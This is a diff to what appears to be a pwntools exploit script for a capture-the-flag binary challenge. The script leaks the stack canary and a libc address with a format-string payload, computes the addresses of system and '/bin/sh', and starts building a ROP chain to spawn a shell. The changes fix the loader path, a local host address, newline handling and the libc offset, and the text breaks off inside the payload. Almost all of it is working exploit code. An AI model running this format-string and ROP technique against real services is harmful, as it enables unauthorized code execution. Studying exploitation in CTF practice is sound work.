@@ -9,7 +9,9 @@ libc = ELF("./libc.so.6")
 context.binary = exe
 context.arch   = "amd64"
 
-HOST = "addr"
+LD = "./ld-linux-x86-64.so.2"
+
+HOST = "127.0.0.1"
 PORT = 1337
 
 GDB_SCRIPT = """
@@ -21,7 +23,8 @@ c
 
 def conn():
     if args.LOCAL:
-        r = process(exe.path)
+        # Use the bundled loader + libc to match the challenge environment
+        r = process([LD, "--library-path", ".", exe.path])
 
         if args.GDB or args.DEBUG:
             pause()
@@ -37,7 +40,9 @@ offset = 72
 def main():
     r = conn()
 
-    r.recvuntil(b"Entrez votre payload :\n")
+    # PTY on remote can translate \n -> \r\n, so be tolerant.
+    r.recvuntil(b"Entrez votre payload :")
+    r.recvline()
 
     r.sendline(b"%41$p.%43$p")
 
@@ -46,7 +51,8 @@ def main():
 
     canary    = leaks[0]
     libc_leak = leaks[1]
-    libc_base = libc_leak - 0x276e9
+    # Leak is __libc_start_main+0x89 in this libc (0x27660 + 0x89 = 0x276e9)
+    libc_base = libc_leak - (libc.sym["__libc_start_main"] + 0x89)
 
     log.success(f"canary    = {hex(canary)}")
     log.success(f"libc_leak = {hex(libc_leak)}")
@@ -66,7 +72,8 @@ def main():
     log.success(f"system  = {hex(system)}")
     log.success(f"/bin/sh = {hex(binsh)}")
 
-    r.recvuntil(b"Entrez votre ROP :\n")
+    r.recvuntil(b"Entrez votre ROP :")
+    r.recvline()
 
     payload = flat(
         b"A"*offset,   
